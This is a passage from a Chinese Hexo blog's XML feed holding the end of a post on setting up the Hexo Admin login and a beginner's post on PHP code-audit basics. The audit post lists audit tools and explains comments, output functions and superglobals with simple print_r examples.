target="_blank" rel="noopener">http://localhost:4000/admin即可进入Hexo</a> Admin后台管理界面</p><p>配置Hexo Admin<br>Settings选项下</p><p><img src="\\images\pasted-17.png\" alt="upload successful"></p><p>点击Setup authentification here</p><p><img src="\\images\pasted-18.png\" alt="upload successful"></p><p>配置你的Hexo Admin登陆账户及密码，以及加密cookies的字符串</p><p>下方会生成配置文件字段，将此复制到站点目录下_config.yml中</p><p>重启hexo server -d，再次访问<a href="http://localhost:4000/admin则需输入账号密码登陆。" target="_blank" rel="noopener">http://localhost:4000/admin则需输入账号密码登陆。</a></p><h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><p><a href="https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html" target="_blank" rel="noopener">https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html</a><br><a href="http://theme-next.iissnan.com/getting-started.html" target="_blank" rel="noopener">http://theme-next.iissnan.com/getting-started.html</a><br><a href="http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html" target="_blank" rel="noopener">http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html</a><br><a href="https://www.cnblogs.com/syd192/p/6074323.html" target="_blank" rel="noopener">https://www.cnblogs.com/syd192/p/6074323.html</a><br> <a href="https://blog.csdn.net/ainuser/article/details/77609180" target="_blank" rel="noopener">https://blog.csdn.net/ainuser/article/details/77609180</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;gitHub是一个面向&lt;a href=&quot;https://baike.baidu.com/item/%E5%BC%80%E6%BA%90/20720669&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;开源&lt;/a&gt;及私有&lt;a href=&quot;https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6/12053&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;软件&lt;/a&gt;项目的托管平台，因为只支持git 作为唯一的版本库格式进行托管，故名gitHub。 Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 &lt;a href=&quot;http://daringfireball.net/projects/markdown/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Markdown&lt;/a&gt;（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 &lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="搭建博客" scheme="http://yoursite.com/categories/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    
    
      <category term="博客" scheme="http://yoursite.com/tags/%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计 基础知识</title>
    <link href="http://yoursite.com/2018/08/08/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://yoursite.com/2018/08/08/PHP代码审计-基础知识/</id>
    <published>2018-08-08T03:04:19.000Z</published>
    <updated>2018-08-09T12:47:47.870Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文记录 PHP 代码审计的学习过程</p><p><a href="https://mp.csdn.net/mdeditor/81107149" target="_blank" rel="noopener">PHP 代码审计博客目录</a></p></blockquote><a id="more"></a> <h1 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h1><h2 id="1-1-测试运行环境"><a href="#1-1-测试运行环境" class="headerlink" title="1.1 测试运行环境"></a>1.1 测试运行环境</h2><p>安装 wamp</p><h2 id="1-2-PHP-编写工具"><a href="#1-2-PHP-编写工具" class="headerlink" title="1.2 PHP 编写工具"></a>1.2 PHP 编写工具</h2><ol><li>EditPlu</li><li>Notepad++</li><li>Zendstudio 10 <a href="https://pan.baidu.com/s/1ZLITLQh0zsXcVlTx-wsZRA?fid=1082316314302126" target="_blank" rel="noopener">百度云下载链接</a></li></ol><h2 id="1-3-代码审计工具"><a href="#1-3-代码审计工具" class="headerlink" title="1.3 代码审计工具"></a>1.3 代码审计工具</h2><p>Seay源代码审计系统 <a href="https://pan.baidu.com/s/1skEE2Bz?fid=143632393324465" target="_blank" rel="noopener">百度云下载链接</a></p><h2 id="1-4-代码审计平台"><a href="#1-4-代码审计平台" class="headerlink" title="1.4 代码审计平台"></a>1.4 代码审计平台</h2><ol><li>DVWA <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">GitHub 链接</a></li><li>ZVulDrill <a href="https://github.com/710leo/ZVulDrill" target="_blank" rel="noopener">GitHub 链接</a></li></ol><h1 id="2-注释"><a href="#2-注释" class="headerlink" title="2. 注释"></a>2. 注释</h1><ol><li>单行注释 =&gt;  //单行注释</li><li>多行注释 =&gt;  /*多行注释*/</li></ol><h1 id="3-单引号和双引号"><a href="#3-单引号和双引号" class="headerlink" title="3. 单引号和双引号"></a>3. 单引号和双引号</h1><ol><li><p>单引号不解析变量</p></li><li><p>双引号解析变量</p><p>aaa=’123’</p><pre><code>echo &apos;$aaa&apos; =&gt; 结果为 $aaaecho &quot;$aaa&quot; =&gt; 结果为 123</code></pre></li></ol><h1 id="4-输出函数"><a href="#4-输出函数" class="headerlink" title="4. 输出函数"></a>4. 输出函数</h1><ol><li>echo 或者 print：最简单的输出方法</li><li>print_r、var_dump(var_export)、debug_zval_dump：输出变量数据值，特别是数组和对象数据</li><li>var_dump 会额外输出数据类型</li><li>print_r：输出格式很整齐，跟var_dump 的区别是没有类型数据，并且布尔值的 false 和 NULL 输出为空</li><li>var_export：所有的数据是可以作为组织好的变量输出的，都是能够作为直接赋值使用；需要注意的一点是, var_export 对于资源型的变量会输出NULL</li><li>debug_zval_dump：输出结果跟 var_dump 类似，唯一增加的一个值是 refcount，就是记录一个变量被引用了多少次，这是 php 的copy on write (写时复制) 的机制的一个重要特点。</li></ol><h1 id="5-超全局变量"><a href="#5-超全局变量" class="headerlink" title="5. 超全局变量"></a>5. 超全局变量</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">超全局变量——超全局变量是在全部作用域中始终可用的内置变量</span><br></pre></td></tr></table></figure><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><ol><li><p>在php 中可由用户操作的全局变量列表如下:</p><p>$GLOBALS — 引用全局作用域中可用的全部变量</p><pre><code>$_SERVER — 服务器和执行环境信息$_GET — HTTP GET 变量$_POST — HTTP POST 变量$_FILES — HTTP 文件上传变量$_REQUEST — HTTP Request 变量$_SESSION — Session 变量$_ENV — 环境变量$_COOKIE — HTTP Cookies</code></pre></li><li><p>已经被弃用的超全局变量</p><p>$_HTTP_COOKIE_VARS</p><pre><code>$_HTTP_ENV_VARS$_HTTP_GET_VARS$_HTTP_POST_FILES$_HTTP_POST_VARS$_HTTP_SERVER_VARS</code></pre></li></ol><h2 id="2-超全局变量示例"><a href="#2-超全局变量示例" class="headerlink" title="2. 超全局变量示例"></a>2. 超全局变量示例</h2><ol><li><p>$GLOBALS</p><h1 id="例一："><a href="#例一：" class="headerlink" title="例一："></a>例一：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$moon=&quot;1&quot;;</span><br><span class="line">echo $GLOBALS[&apos;moon&apos;];</span><br><span class="line">?&gt;</span><br><span class="line"># 显示结果为1</span><br><span class="line"></span><br><span class="line"># 例二</span><br><span class="line">&lt;?php</span><br><span class="line">function test()&#123;</span><br><span class="line">echo $moon=&quot;2&quot;;</span><br><span class="line">echo $GLOBALS[&apos;moon&apos;];</span><br><span class="line">&#125;</span><br><span class="line">$moon=&quot;1&quot;;</span><br><span class="line">test();</span><br><span class="line">?&gt;</span><br><span class="line"># 显示结果为 21 </span><br><span class="line"># 函数内部为局部变量，不被 $GLOBALS 所识别</span><br></pre></td></tr></table></figure></li><li><p>$_SERVER</p><p>test1.php</p><pre><code>&lt;?phpprint_r($_SERVER);?&gt;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test2.php</span><br><span class="line">&lt;?php</span><br><span class="line">$_SERVER=&apos;aaaaaa&apos;;</span><br><span class="line">print_r($_SERVER);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果为服务器的配置信息</p><p><img src="https://i.imgur.com/NxGTsQ1.png" alt=""></p><p>输出结果可以被覆盖</p><p><img src="https://i.imgur.com/W6GgqVz.png" alt=""></p></li><li><p>$_GET</p><p>test.php</p><pre><code>&lt;?phpprint_r($_GET);?&gt;</code></pre><p>输出结果为 URL 中的 GET 变量的数据</p><p><img src="https://i.imgur.com/30xFhlN.png" alt=""></p></li><li><p>$_POST</p><p>test.php</p><pre><code>&lt;?phpprint_r($_POST);?&gt;</code></pre><p>输出结果为 URL 中的 POET 变量的数据</p></li><li><p>$_FILES</p><ol><li>file.html<br><form action="test.php" method="post" enctype="multipart/form-data"><pre><code>&lt;lable for=&quot;file&quot;&gt;Filename:&lt;/lable&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;&lt;br /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;</code></pre><ol><li>test.php<br>&lt;?php<br>print_r($_FILES);<br>?&gt;</li></ol></form></li></ol><p>输出结果为提交的文件的信息</p><p><img src="https://i.imgur.com/0aqkmXB.png" alt=""></p></li><li><p>$_REQUEST</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">test1.php</span><br><span class="line">&lt;?php</span><br><span class="line">print_r($_REQUEST);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">test2.php</span><br><span class="line">&lt;?php</span><br><span class="line">$_REQUEST=&apos;aaaaaa&apos;;</span><br><span class="line">print_r($_REQUEST);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">输出结果可以被覆盖</span><br><span class="line"></span><br><span class="line">![](https://i.imgur.com/W6GgqVz.png)</span><br></pre></td></tr></table></figure><ol><li><p>$_SESSION</p><p>test1.php</p><pre><code>&lt;?phpprint_r($_SESSION);?&gt;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test2.php</span><br><span class="line">&lt;?php</span><br><span class="line">$_SESSION=&apos;aaaaaa&apos;;</span><br><span class="line">print_r($_SESSION);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果可以被覆盖</p><p><img src="https://i.imgur.com/W6GgqVz.png" alt=""></p></li><li><p>$_ENV</p><p>test1.php</p><pre><code>&lt;?phpprint_r($_ENV);?&gt;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">test2.php</span><br><span class="line">&lt;?php</span><br><span class="line">$_ENV=&apos;aaaaaa&apos;;</span><br><span class="line">print_r($_ENV);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">test3.php</span><br><span class="line">&lt;?php</span><br><span class="line">print_r($_ENV[&apos;OS&apos;]=&apos;bbbbbb&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果可以被覆盖</p><p><img src="https://i.imgur.com/W6GgqVz.png" alt=""></p><p><img src="https://i.imgur.com/XROLZ85.png" alt=""></p></li><li><p>$_COOKIE </p><p>test.php</p><pre><code>&lt;?phpprint_r($_COOKIE);?&gt;</code></pre><p>输出结果为 cookie 值</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文记录 PHP 代码审计的学习过程&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.csdn.net/mdeditor/81107149&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;PHP 代码审计博客目录&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="编程" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
  </entry>
  
</feed>
